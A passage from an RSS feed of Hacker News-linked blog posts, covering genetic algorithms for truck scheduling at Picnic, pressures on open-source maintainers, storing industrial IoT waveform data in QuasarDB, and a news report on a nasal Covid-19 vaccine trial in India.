this format. Luckily, in this case modeling the DNA is trivial: since we’re looking for a string, the DNA is simply a sequence of characters.</p><p id="2246">The first step of running the GA is to generate the initial population. Usually, this is achieved by simply generating random DNA sequences. For our game, we’ll start with the following initial population: “ugjhel”, “prjuyj”, “gbenih”, “bxoagp”, “yiptor” and “zyglcs”.</p><p id="df54">Each generation of individuals will face the GA equivalent of natural selection: the best solutions will be allowed to reproduce while the rest will be forgotten. We want to maintain diversity in our gene pool. This prevents us from getting stuck with a population of good individuals, but with only limited potential to produce the best individual. We’ll apply a method called Tournament Selection to achieve this, but many other methods exist.</p><p id="825e">During tournament selection we’ll divide our population into groups randomly (the tournaments) and pick the best individual (having the most correct letters) from each one. For example we could divide the population generated in step 2 into two tournaments: “ugjhel”, “prjuyj” and “bxoagp” are a single tournament. “gbenih”, “yiptor” and “zyglcs” make up the other. The winner of the first tournament is “<strong>p</strong>rjuyj” (1 correct letter). “gbe<strong>ni</strong>h” (2 correct letters) wins the other. They will move on to the next phase: reproduction.</p><p id="814a">After individuals with a low fitness have been eliminated, the remaining ones will reproduce until the population reaches its original size. When reproducing, the DNA of two individuals is combined. We split both individuals’ DNA at (the same) random point, pasting two parts together and discarding the others. This process is called crossover. After crossover, there’s a random chance that each character in the new individual’s genome will be changed to another random one: mutation.</p><p id="f120">Both crossover and mutation mimic their natural counterparts. Together they ensure that there is enough variation in the gene pool, while moving closer to an optimal solution with each generation.</p><p id="b526">Our parents “prjuyj” and “gbenih” will produce 4 children (for example “prenih”, “prguyj”, “geeuyj”, “prjuyh”) to reach the original population size of 6 individuals. Out of this offspring, “<strong>p</strong>re<strong>ni</strong>h” has actually improved on its parents since it has 1 additional correct letter.</p><p id="6412">After refilling the population, the GA moves back to step 3. It continues this cycle of reproduction and natural selection until its population contains an individual that has 100% correct characters. One particular run of this algorithm is graphed below, showing the quality of the best individual in each generation and the average of all individuals. Its population contained “picnic” after 36 generations, meaning it had to guess the word 216 times (evaluating every individual for every iteration). This is a huge improvement over searching all 308,915,776 possibilities.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/850/0*pWcyupqUeLrJZS7l" width="425" height="325" srcset="https://miro.medium.com/max/552/0*pWcyupqUeLrJZS7l 276w, https://miro.medium.com/max/850/0*pWcyupqUeLrJZS7l 425w" sizes="425px" data-old-src="https://miro.medium.com/max/60/0*pWcyupqUeLrJZS7l?q=20"></p></div></div></figure><p id="4ee7">After playing our very simple word guessing game, we can conclude a few things about GAs:</p><ul><li id="6651">They generate many different solutions to a problem, getting progressively better, but without having to explore every single solution.</li><li id="7a48">Each of the generated individuals has to be evaluated.</li><li id="1e2e">They have a number of mechanisms to prevent getting stuck at suboptimal solutions.</li></ul><p id="17a9">Before our word guessing game we mentioned Picnic uses a GA to solve the problem of scheduling trucks. So how do we implement this, more complex, problem as a GA and how does it perform?</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2400/0*e-xDVO3iPvGzabkb" width="1200" height="801" srcset="https://miro.medium.com/max/552/0*e-xDVO3iPvGzabkb 276w, https://miro.medium.com/max/1104/0*e-xDVO3iPvGzabkb 552w, https://miro.medium.com/max/1280/0*e-xDVO3iPvGzabkb 640w, https://miro.medium.com/max/1400/0*e-xDVO3iPvGzabkb 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*e-xDVO3iPvGzabkb?q=20"></p></div></div></div><figcaption>Unloading a shipment at a hub.</figcaption></figure><p id="6f97">Before making the truck schedule, our algorithms have already determined which groceries should be packed together in a shipment (a truck trailer full of groceries). The input to the GA are these shipments, which need to go from a warehouse to a hub before a certain time. Additionally we’ve estimated the number of trucks we will require and input that to the GA too. The GA will then calculate which truck takes which shipment at what time. As the number of shipments and trucks grows, the number of possible shipment-to-truck mappings explodes. This indicates that a GA is a good fit for this problem, since we cannot try out every possible option.</p><p id="600c">Usually, the biggest challenge in implementing a GA is modelling the DNA. We have to make sure that the DNA supports crossover and mutation, while keeping it easy to evaluate the quality of an individual.</p><p id="17a4">In our model each truck and shipment is assigned an incrementing integer ID. For example, if on a given day 2 trucks will be driving from Picnic warehouses to hubs they will be labelled Truck 0 and Truck 1 for that day. If there are 4 shipments that day, they will be labelled Shipment 0, Shipment 1, Shipment 2, Shipment 3. Given this information, the DNA for the whole truck schedule can just be one big list of integers. In this list each index represents a shipment ID and each value represents the truck ID this shipment will be transported by. There is one catch though, since we want each truck to have at least one shipment. To ensure this we simply assign each truck one initial shipment and do not put these shipments in the DNA. Because of this, the length of each individual’s DNA is equal to: <em>number of shipments</em> — <em>number of trucks</em>.</p><p id="481d">Now that we have modeled assigning shipments to trucks, we need a way to build a complete schedule. We achieve this simply by looking at the latest departure time of a shipment. We fill up a truck’s schedule from the back to the front, starting with the shipment that can depart the latest and adding shipments until none remain.</p><p id="d4cb">So, for example, if we have the following shipments which should fit into 2 trucks:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3212/1*WH7zBAMoje8_XN_KGnLD8Q.png" width="1606" height="468" srcset="https://miro.medium.com/max/552/1*WH7zBAMoje8_XN_KGnLD8Q.png 276w, https://miro.medium.com/max/1104/1*WH7zBAMoje8_XN_KGnLD8Q.png 552w, https://miro.medium.com/max/1280/1*WH7zBAMoje8_XN_KGnLD8Q.png 640w, https://miro.medium.com/max/1400/1*WH7zBAMoje8_XN_KGnLD8Q.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*WH7zBAMoje8_XN_KGnLD8Q.png?q=20"></p></div></div></div></figure><p id="3c6a">Then our DNA could look like this: [1, 2]. And the resulting schedule would be the following:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3132/1*x85upUfeB-EpvyLFV7JQpg.png" width="1566" height="298" srcset="https://miro.medium.com/max/552/1*x85upUfeB-EpvyLFV7JQpg.png 276w, https://miro.medium.com/max/1104/1*x85upUfeB-EpvyLFV7JQpg.png 552w, https://miro.medium.com/max/1280/1*x85upUfeB-EpvyLFV7JQpg.png 640w, https://miro.medium.com/max/1400/1*x85upUfeB-EpvyLFV7JQpg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*x85upUfeB-EpvyLFV7JQpg.png?q=20"></p></div></div></div></figure><p id="9caa">In this case, there’s a gap between Shipment 0 and 2 so Shipment 0 can depart in time. Shipment 3 will depart an hour earlier than its latest departure time to make it fit before Shipment 1.</p><p id="9563">Since this is a GA we need to evaluate the individuals. In this case we’d like to have as much time as possible to prepare each shipment in the warehouse. So as an objective function we’ll take the sum of differences in shipments’ latest departure time and actual departure time. In the above solution this would be 1 hour and the optimal solution would be 0 hours.</p><p id="ad3c">For the DNA described above, even if there are only 15 shipments and 5 trucks, the number of possible individuals is 9,765,624. The goal for our GA is to find a solution while evaluating significantly fewer individuals.</p><p id="312f">The graph below shows one run of our GA for 30 shipments and 15 trucks (making the possible number of individuals much higher than the 9,765,624 mentioned above). It shows the sum of deviations from the latest departure time, both for the best individual and the average of each generation’s population. It found an optimal solution in just 14 generations of 100 individuals (so only evaluating 1400). Making it much more efficient than iterating over all solutions.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/846/0*Ozy1u7R595Z3IbCp" width="423" height="325" srcset="https://miro.medium.com/max/552/0*Ozy1u7R595Z3IbCp 276w, https://miro.medium.com/max/846/0*Ozy1u7R595Z3IbCp 423w" sizes="423px" data-old-src="https://miro.medium.com/max/60/0*Ozy1u7R595Z3IbCp?q=20"></p></div></div></figure><p id="26d3">The disadvantage of all GAs, including this one, is that they might never find the optimal solution. A good strategy is to cut off the GA after a number of generations without improvement. This way you will always end up with a good enough solution in reasonable time.</p><p id="9835">Genetic Algorithms are a great way to approximate solutions to optimization problems in a reasonable time. At Picnic things move fast. In our truck scheduling problem we introduced way more constraints than described here. For example, we make sure that enough storage space for arriving shipments is available at our hubs. Luckily, these changes are easily made to a GA by just including them in the objective function evaluating individuals. We need to solve these kinds of newly arising problems continuously and update our existing solutions for new …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.picnic.nl/its-in-our-dna-solving-logistics-problems-using-genetic-algorithms-a3d59e31558c">https://blog.picnic.nl/its-in-our-dna-solving-logistics-problems-using-genetic-algorithms-a3d59e31558c</a></em></p>]]>
            </description>
            <link>https://blog.picnic.nl/its-in-our-dna-solving-logistics-problems-using-genetic-algorithms-a3d59e31558c</link>
            <guid isPermaLink="false">hacker-news-small-sites-25685721</guid>
            <pubDate>Fri, 08 Jan 2021 15:39:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Five Pressures of Leadership in OSS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25685688">thread link</a>) | @alexellisuk
<br/>
January 8, 2021 | https://blog.alexellis.io/the-5-pressures-of-leadership/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/the-5-pressures-of-leadership/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><p>In this post I want to introduce the reader to five pressures that I have encountered over the past five years of building, leading, and maintaining Open Source Software (OSS) with community. This essay is primarily about being a leader in Open Source, but I believe <a href="https://www.amazon.co.uk/How-Survive-Thrive-Church-Leader/dp/1854247611">it applies outside of technology</a> too.</p>
<blockquote>
<p>My aim is to foster understanding and empathy between contributors, community members, users, and maintainers. I would also like for maintainers and leaders in Open Source to feel a sense of solidarity in their shared burden.</p>
</blockquote>
<p>It is often said that Open Source Software is not sustainable, because it has no inherent business model, but I believe there are other pressures that leaders experience which when left unchecked may lead to "burn-out".</p>
<p>I'll briefly describe what I believe leadership means before introducing each of the pressures and how they may be experienced. It's my opinion that the examples apply beyond Open Source Software and the technology industry. I will then sum up the pressures and make a case for sustainable leadership.</p>
<p>As a disclaimer, I've generalised my experience and what I've shared here. I am not referring to any one person, even if you can identify with what I'm saying.</p>
<h2 id="whatisleadership">What is leadership?</h2>
<p>The Oxford English Dictionary defines leadership as a noun:</p>
<ul>
<li>
<p>the action of leading a group of people or an organization.</p>
<p>Synonymns: guidance, direction, authority, control, management, superintendence, supervision; organization, government, orchestration, initiative, influence</p>
</li>
<li>
<p>the state or position of being a leader.</p>
<p>Synonymns: headship, directorship, direction, governorship, governance, administration, jurisdiction, captaincy, superintendency, control, ascendancy, rule, command, power, mastery, domination, dominion, premiership, sovereignty</p>
</li>
</ul>
<p>It is clear from the sheer amount of synonymns for the term, that the word itself can have many meanings and nauances. I would also suggest that the our own experiences and culture may project specific expectations and connotations.</p>
<p>For some Open Source maintainers, leadership may start unintentionally. A developer may become inspired to build an idea into a project and by default is the director and administrator. All of the control rests with them and at this stage the project is likely to be classed as be a Proof of Concept (PoC), an experiment or a "side-project." Other people are unlikely to be involved, but that may change quickly. The maintainer is the de factor leader in their team of one.</p>
<p>Some projects remain in this state, but others may draw in users and contributors who in turn volunteer their time, ideas, and energy to advance the project. The maintainer must now set a direction, communicate it, and begin to decide how to govern the project. For me mirroring the style of other maintainers and leaders I knew helped significantly. In my experience these skills can be learned "on the job", but it's easy to get things wrong.</p>
<p>In most companies there are two tracks for a career - either as an individual contributor or as a people-manager. Individual Contributors tend to be builders of things and have very technical work. They may also lead a team or hold responsibility depending on their level of seniority. <a href="https://www.amazon.co.uk/Managing-Humans-Humorous-Software-Engineering/dp/1430243147">People managers have a very different set of skills</a> and deliver results for the business through delegation and by constantly communicating across teams.</p>
<p>In a corporation you are likely to have a very clearly defined role and hierarchy to fall into, but as an Open Source leader and maintainer your work will be a mixture of the two tracks.</p>
<p>This is an apt time to introduce the first pressure: unclear boundaries.</p>
<h2 id="1unclearboundaries">1. Unclear boundaries</h2>
<p>What is your role? What does it say on LinkedIn, and on your business cards? Does that differ from what you actually do on a day to day basis? Do you work 1 in 3 weekends? Are you on rotation for on-call duties? Do you have reports?</p>
<p>As a leader of a community and an Open Source project, there is no job description and there are no set hours. One of the synomymns for leadership is governance, and that can cover how you and the project operate. I started to define a model for governance with a "Contributing Guide" which explains the process for raising an issue or requesting a change.</p>
<p>People who come to the project now look to me and the other primary contributors to operate within that governance model and for that reason it is important to do so. Some may not be aware of the processes and some even chose to ignore them. I believe that leaders need to be flexible, but if they say one thing and to do another continually, then it sets a confusing example for others to follow.</p>
<p>When I began I enjoyed the interest in my projects from users and contributors from all around the world. People would contact me at all hours of the day and night and I wanted to reply to every notification and email within minutes, if I could. I quickly found that I wouldn't be able to keep that up.</p>
<p>Having no clear hours means that unless you are careful, that you are actually on-call 27/4, 365 days, even when you're on vacation.</p>
<p>If left unchecked then unclear boundaries can lead to an intermingling of the leader's self with the project and team. I believe that this is understandable given the investment and stake the leader has, but gaining validation and self-worth through the success or failure, growth rate or decline of something outside of their control is a recipe for burning out.</p>
<p>Rather than being able to celebrate past achivements, the leader may start to feel pressure to grow the project to compete with similar product offerings. Those products may be built by companies with well-staffed teams and 7-figure budget, so it is not unly unatainable, but unfair.</p>
<p>The pressure of unclear boundaries means that users and other contributors may bring unreasonable expectations to your door and you may feel obliged to do what is asked of you.</p>
<h2 id="2pay">2. Pay</h2>
<p>Whilst the curve for leadership positions within a corporation inflects up steeply, this is simply a different matter in Open Source and those involved in other types of public service.</p>
<p>In my opinion there is no clear business model for Open Source Software, which means there is also no reason for someone to pay me for maintaining or building that software. A friend recently explained this to me in terms of "value capture", which I found immensely useful.</p>
<p>OSS allows companies and other OSS projects to stand on the tall shoulders of those that came before, and to either enhance or to put a new spin on prior work. That means capturing and amplifying existing value for something new.</p>
<p>In the same way that I cannot and will not be able to afford to pay the Golang development team for their many years of efforts that I leverage in my work. It seems equally unlikely that an end-user company will be able to pay me for the value I have created for them, that they capture and amplified in their business.</p>
<blockquote>
<p>It is liberating to remove the unrealistic and unreasonable expectation that end-user companies should pay us for our work.</p>
</blockquote>
<p>Given that maintaining and building features for OSS can take a significant amount of time, this leaves maintainers with only a few options. Such as the following:</p>
<ul>
<li>Work full-time for a company, and overtime for the OSS project in your evenings and weekends</li>
<li>Work part-time consulting through your own company, and part-time without pay for your OSS project</li>
<li>Find a co-founder, seek out investment, and build a commercial product from the project</li>
<li>Don't earn a salary at all, and work for full-time without pay on the OSS project</li>
<li>Close the OSS project, or pass the mantle on to someone else</li>
</ul>
<p>There are some exceptions where developers are recruited and paid to work on Open Source projects for a variety of reasons. This is much different than a maintainer being hired specifically to maintain and build the project they lead.</p>
<p>You will also note that I did not include <a href="https://github.com/users/alexellis/sponsorship">"sponsorship" as an option</a>, this is because in my experience sponsorship is a hard sell and difficult to do meaningfully. I currently view sponsorship as a top-up mechanism to part-time consulting, rather than as a means to an end.</p>
<p>Whichever option a maintainer picks, there will always be a significant amount of money left on the table. This is a pressure that can build over time, especially when compared to peers working for a company.</p>
<h2 id="3workingwithvolunteers">3. Working with volunteers</h2>
<p>Has anyone ever asked you to do them a favour?</p>
<p>It may be something as simple as getting a latte for a colleague on your coffee run, helping your neighbour move house, giving your wife a lift to work because her car is in at the mechanic's, reaching into your pocket to give change to someone on the street, going bowling for a work outing, or even setting up a new printer for a relative.</p>
<p>How did you feel about the ask? "It depends" you say. It depends on the relationship, how much it inconveniences you, and what you may get back in return. I know that if it's my turn to buy dinner, next time I meet my friend, he will be paying.</p>
<p>With the example of taking my wife to work, it's highly unlikely that I'd flake. I can't think of anything I'd rather do less than setting up a relative's printer and I would easily change my mind about the work bowling trip.</p>
<p>I believe that when leading an Open Source project or a community, that volunteers are essential to its success. As a maintainer, your pay is already below par and funding is unlikely to be bountiful. So relying on goodwill, favours, and external contributions become ever more important as the project grows. Not to mention that to grow and extend the impact of your project, you will need to delegate responsibility and duties to other people.</p>
<p>Other leaders will be quick to tell you to "just delegate". In my experience delegation is key to growing a community and for motivating others to act not only in their own interest, but for the common good.</p>
<p>If a maintainer starts a project on their own, then it may be hard …</p></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.alexellis.io/the-5-pressures-of-leadership/">https://blog.alexellis.io/the-5-pressures-of-leadership/</a></em></p>]]>
            </description>
            <link>https://blog.alexellis.io/the-5-pressures-of-leadership/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25685688</guid>
            <pubDate>Fri, 08 Jan 2021 15:35:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Large scale Industrial IoT data project: lessons learned in 2020]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25685491">thread link</a>) | @stingraycharles
<br/>
January 8, 2021 | https://blog.quasardb.net/large-scale-industrial-iot-data-project-lessons-learned-in-2020 | <a href="https://web.archive.org/web/*/https://blog.quasardb.net/large-scale-industrial-iot-data-project-lessons-learned-in-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_151456960811572" data-hs-cos-general-type="widget" data-hs-cos-type="module">
    <div>
<div>

<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><h2>Introduction</h2>
<p>Industrial Internet of Things (IIoT) is facing the new challenge of having to ingest very high volume of timeseries data <strong><em>and</em></strong> perform complex analysis in real time.</p>
<!--more-->
<p>Doing one of the two is hard, the two at the same time is extremely challenging. In other words, you want to have your cake, eat it, own the bakery, and paying yourself massive dividends every year.</p>
<p>Quasardb was built on the vision where we can make the world more efficient if we instrument everything, at the highest possible resolution, and use that data to make decisions. This is applying the logic of a quantitative hedge fund (who happen to be another big vertical for us) to the industrial world.</p>
<p>The first part of the plan was to build the database engine capable of processing the new volume of data while delivering complex analytics.</p>
<p>In 2020, we have started phase two of our plan where we integrate the database in the industrial apparatus.</p>
<p>This blog post is about the lessons we’ve learned along the way.</p>
<h2>Timeseries in Industrial IoT</h2>
<h3>Monitoring</h3>
<p>When you build monitoring for your industrial application, you can get away with one point per second (and sometimes even less) per sensor. Even if you have hundreds of thousands of sensors, that's still less than a million points per second, often below a megabyte per second of new data.</p>
<p>Additionally, monitoring rarely requiress a high-resolution history, meaning that you can reduce the resolution to one point per minute (or even less), making it possible to fit a multi-year history in less than a gigabyte.</p>
<p>That's because if you're interested in "when a failure happened," you don't need to know at the microsecond.</p>
<h3>Predictive maintenance</h3>
<p>Monitoring is a must, but monitoring is reacting when you should be anticipating. What you want to do is to know when a problem will happen before it happens: that's predictive maintenance. To do that, you build models on finely grained data. Once your model is ready, you then inject all that raw data in real-time and process alerts.</p>
<p>How does it work? You're looking for something called "weak signals." A weak signal can be, for example, a specific spike of electric consumption, which in itself isn't a problem, but, after analyzing years of historical data, you know this spike (or series of spikes) is heavily correlated, with, for example, a turbine failure.</p>
<p>The higher the resolution, the better because the difference between a non-event and the prelude to a problem can be very subtle. It is as if you were trying to make sense of a green spot on a low-resolution picture. Is it a tree, an animal, a person?</p>
<h2>Another class of problem</h2>
<p>Old-school monitoring applications don't impose a particular challenge on databases unless you are at an enormous scale. When you have data with second-granularity, a case could be made that you maybe don't even need a timeseries database, except for convenience, efficiency, or because you're doing specific queries that TSDBs are very good at (such as ASOF joins).</p>
<p>However, serious predictive maintenance is another story. Sensors typically sample at 2-4 kHz, which means you have 2,000 to 4,000 times more data than before. Some customers are even beyond 20 kHz, that is 20,000 times more data than second-granularity!</p>
<p>Gigabytes become terabytes; terabytes become petabytes.</p>
<p>You could downsample. But will you make up what the green spot on the image is?</p>
<p>As an example, we'll focus on electrical waveform data to discuss the specific challenges of doing data science on the full raw stream of data.</p>
<h2>What do we mean by electrical waveform data?</h2>
<p>Electrical waveform data represents the variation of electricity amperage (I) and voltage (U) over time.</p>
<p>If you see electricity as a stream of water, amperage is the strength of the current, and voltage is the difference in height between two points.</p>
<p>The electricity you have at home is called two-wire single-phase electric power, with a third conductor called the ground to prevent electric shock. The current alternates, meaning the voltage varies over time at a fixed frequency (usually 50 Hz or 60 Hz). If you wanted to monitor an electric outlet at home, you would thus have two values at any point in time.</p>
<p>However, in industrial applications, <a href="https://en.wikipedia.org/wiki/Three-phase_electric_power" rel="noopener" target="_blank">three-wire three-phase electric power</a> is the norm, mostly because it enables you to transmit the same amount of electrical power with less conductor material. This means that for every point, you don't have just two values (I and U), but six (I1, U1, I2, U2, I3, U3). Oops! Suddenly, three times more data!</p>
<h2>A problem of scale</h2>
<p>But, wait, there's more!</p>
<p>We have observed that data within machinery is often sampled between 1 kHz and 5 kHz; you can represent each point using fixed-point notation or floating-point notation data. The sensor's bit depth is usually around 16-bit, meaning a double-precision floating-point (64-bit) will have no loss of precision, and floating-point is often easier to work with for data scientists.</p>
<p>If you include a nanosecond precise timestamp, every sample is 6 floating-point values and 1 high-resolution timestamp. Because life is never simple, every sample comes with labels in strings embedding necessary metadata. No, you can't get rid of the labels, unless you really want the data science team to be unhappy!</p>
<p>Long stories short, you quickly end up with <strong>tens, if not hundreds, of megabytes of</strong> <strong>raw data</strong> <strong>per second</strong> to store in your database.</p>
<h2>How did our users solve the problem?</h2>
<p>Prior to using QuasarDB, customers would typically use one of the following approaches:</p>
<ul>
<li>Give up and working on raw data and downsample it until it fits in the system.</li>
<li>Store the waveform data in blocks of x seconds in blob storage and resort to convoluted scripts to inject that data into data science tools. This can record the data at the required speed, but at the cost at very high querying complexity (and forget about those fancy <a href="https://doc.quasardb.net/master/queries/select.html" rel="noopener">ASOF joins</a>!). It can also create impedance problems with the data science tools that need to load more data than required.</li>
<li>Use a data warehousing solution such as Redshift, Big Query, or Snowflake. That works for a while until the data scientist team realizes that queries remain very slow even with an infinite amount of money, and the CFO shows up at the office with an explosive vest. That's because data warehousing solutions are <strong>not optimized</strong> for write-heavy scenarios. No free lunch! All these indexes are expensive to maintain.</li>
<li>Use Hadoop and… no just kidding.</li>
</ul>
<p>If you work in finance, the above may remind you of the dilemma of working with Level II Market Data.</p>
<h2>How we solve the problem</h2>
<p>We think the good solution enables ingestion at least one order of magnitude faster than the data arrives (to enable restoring from backups in a reasonable amount of time), while enabling transparent querying so that the data science team can pick and zoom on any part of the history at any time.</p>
<p>On top of that, you want storage to be cost efficient through compression.</p>
<p>To do that, we store raw waveforms as timeseries data inside QuasarDB. These waveform can be queried through a SQL-like language or retrieved at very high-speed using a low-level API, when needed.&nbsp;&nbsp;&nbsp;</p>
<h2>How we typically model the waveform</h2>
<h3>Flexible representation</h3>
<p>The typical approach in data warehousing is to store all the data in a couple of large tables and pray the underlying implementation will sort it out. It almost works until you write hundreds of millions of points per second to a table, and the SSD starts to generate a black hole under the data pressure.</p>
<p>Fortunately, a <a href="https://en.wikipedia.org/wiki/Quasar" rel="noopener" target="_blank">quasar </a>isn't a black hole.</p>
<p>The most efficient and convenient way to store waveforms in QuasarDB is to store each sensor as a separate timeseries. It's convenient because you can align waveforms to each other using ASOF joins or downsample them on the fly. You can also easily visualize them for any arbitrary time range without worrying about the underlying representation.</p>
<p>You may ask, but then, how can I query a group of sensors? We have a solution for that: table tagging.</p>
<p>Let's imagine we have two sensors for three-phase electrical data, in two separate tables, stored as such:</p>
<p><span>CREATE TABLE sensor1 (phase1 double, phase2 double, phase3 double)</span></p>
<p><span>CREATE TABLE sensor2 (phase1 double, phase2 double, phase3 double)</span></p>
<p>You can group these two tables by attaching a tag "machine_a" to both of them and then write the following query</p>
<p><span>SELECT * FROM FIND(tag=’machine_a’)</span></p>
<p>Which will be the equivalent of</p>
<p><span>SELECT * FROM sensor1, sensor2</span></p>
<p>Since tags can be added, changed, and removed instantly, this creates a very flexible meta-model and doesn't force too many decisions early in the project. Adding a sensor is just adding a table. A single table can have thousands of tags, and tags can be tagged to allow for recursive queries (more on this in the doc).</p>
<p>Ok, now, I can hear you say, "but how will I write to thousands of tables at the same time?!". Luckily, we also have a solution: our batch writer supports multi-table writes and optimizes the exchanges with the database. Using the batch writer, one of our customers commits to 250,000 tables every minute on a cluster made of only two <a href="https://aws.amazon.com/ec2/instance-types/" rel="noopener" target="_blank">AWS m5.8xlarge nodes</a>.</p>
<p>If you're interested in learning more about writing efficiently to Quasardb, <a href="https://blog.quasardb.net/achieving-maximum-write-speed-with-quasardb" rel="noopener" target="_blank">this blog post</a> may be of interest.</p>
<h3>Efficient encoding</h3>
<p>While QuasarDB delivers raw power, you can go even further by being smart about how you represent the data.</p>
<p>To achieve maximum performance, the first thing we do is leverage the <a href="https://doc.quasardb.net/master/queries/create_table.html" rel="noopener" target="_blank">symbol tables</a> of QuasarDB to minimize the size of the strings at every row. A symbol table is a big dictionary that will associate an integer to a string value and is a great choice when strings' cardinality is low. Symbol tables are dynamic so you don't have to know every possible string representation in advance, and they can hold billions of symbols efficiently.</p>
<p>Symbol tables are more efficient for two reasons. First, encoding an integer is smaller than a string as soon as the string exceeds 8 characters. Even when that's not the case, our …</p></span></p></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.quasardb.net/large-scale-industrial-iot-data-project-lessons-learned-in-2020">https://blog.quasardb.net/large-scale-industrial-iot-data-project-lessons-learned-in-2020</a></em></p>]]>
            </description>
            <link>https://blog.quasardb.net/large-scale-industrial-iot-data-project-lessons-learned-in-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25685491</guid>
            <pubDate>Fri, 08 Jan 2021 15:18:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India could get nasal vaccine against Covid-19 soon]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25685187">thread link</a>) | @jangid
<br/>
January 8, 2021 | https://www.indiatoday.in/coronavirus-outbreak/story/india-nasal-coronavirus-vaccine-soon-trials-begin-nagpur-1756780-2021-01-07 | <a href="https://web.archive.org/web/*/https://www.indiatoday.in/coronavirus-outbreak/story/india-nasal-coronavirus-vaccine-soon-trials-begin-nagpur-1756780-2021-01-07">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>A nasal Covid-19 vaccine could be a reality in India soon with Bharat Biotech, the Indian vaccine maker, all set to start phase 1 and 2 trials of a nasal vaccine at Gillurkar Multi Speciality Hospital in Nagpur.</p><p>Bharat Biotech’s head Dr Krishna Ella said on Thursday, "We are working on a nasal vaccine and have partnered with the Washington University School of Medicine. We are working on a single dose vaccine compare to two-dose inactivated vaccine. Research has proven that the nasal vaccine is the best choice. Coronavirus also attacks through the nose."</p><p>"We are <a href="https://www.indiatoday.in/coronavirus-outbreak/vaccine-updates/story/bharat-biotech-founder-assures-safety-of-covaxin-nasal-vaccine-1755712-2021-01-04" target="_blank">all set to host the trials for the nasal Covaxin in the next two weeks</a>. Enough scientific evidence is available that vaccines given through nasal route are more effective than injected ones. Bharat Biotech is in the process to submit a proposal to the DCGI shortly," said Dr Chandrashekar Gillurkar.</p><p>The trials will be conducted on at least 30-45 healthy volunteers above the age of 18 till the age of 65 years at four trial sites in the country -- Bhuvneshwar, Pune, Nagpur and Hyderabad.</p><p>Presently, Bharat Biotech is working on two intranasal vaccines -- one with US-based vaccine maker FluGen and scientists from the University of Wisconsin Madison and the other with the University of Washington School of Medicine.</p><p>Experts say that the nasal variant of the Covid-19 vaccine, which is currently under trial in the US, could play a major role in stopping transmission of the virus.</p><p><em><strong>Read: <a href="https://www.indiatoday.in/coronavirus-outbreak/vaccine-updates/story/confused-about-covid-19-vaccines-this-is-for-you-1756786-2021-01-07" target="_blank" title="Confused about Covid-19 vaccines? This is for you">Confused about Covid-19 vaccines? This is for you</a></strong></em></p><h3><span><strong>WHAT IS NASAL VACCINE?</strong></span></h3><p>Unlike other Covid-19 vaccines that are administered intramuscularly (or through the muscles), this one is delivered via the nose, which is also an initial point of infection in humans.</p><p>A study done by the University of Washington School of Medicine in St Louis found that the nasal delivery route created a strong immune response throughout the body, but it was particularly effective in the nose and respiratory tract, preventing the infection from taking hold in the body.</p><p><em><strong>Read: <a href="https://www.indiatoday.in/coronavirus-outbreak/story/vaccination-doesn-t-guarantee-100-protection-wearing-mask-is-must-experts-1756766-2021-01-07" target="_blank" title="Vaccination doesn't guarantee 100% protection, wearing mask is must: Experts">Vaccination doesn't guarantee 100% protection, wearing mask is must: Experts</a></strong></em></p><h3><span><strong>ARE NASAL VACCINES BETTER THAN INJECTIONS?</strong></span></h3><p>Experts say the nasal Covid-19 vaccine has the potential to become a game-changer because injecting the vaccine intramuscularly only protects the lower lung. A nasal vaccine can protect both the upper and lower lung and can prevent transmission of the virus as well as an infection.</p><p>Dr Samiran Panda, senior epidemiologist at Indian Council of Medical Research said nasal vaccine provides benefits such as faster absorption, lesser volume and no use of syringes.</p><p> <img data-src="https://akm-img-a-in.tosshub.com/indiatoday/images/bodyeditor/202101/PHOTO-2021-01-07-23-05-59-x1280.jpg?CsWamucYQxVXvG9OqXSQo33RxTxirvDo" src="https://akm-img-a-in.tosshub.com/indiatoday/images/bodyeditor/202101/PHOTO-2021-01-07-23-05-59-x1280.jpg?CsWamucYQxVXvG9OqXSQo33RxTxirvDo" alt=""></p><p>"There are two arms of the immune system in the body - one is antibody or protein and one is cellular immunity. <a href="https://www.indiatoday.in/coronavirus-outbreak/story/mucosal-immunity-prevent-covid-outbreak-1745369-2020-11-30" target="_blank">The mucosal immunity is created</a> when administered a nasal vaccine against those infections that enter our body through the nose or respiratory tract. Coronavirus impacts the respiratory tract the most. Therefore, the nasal vaccine is much better. Antibodies will be secreted directly into the nasal mucous membrane, where you need more concentration of the antibody because it is where the infection begins from."</p><p><strong>Faster absorption:</strong></p><p>When administered orally or nasally, the antigen is presented to the mucous membrane, the absorption is much better and it quickly goes to the lymph nodes. There is an effective presentation of the viral antigen directed at the 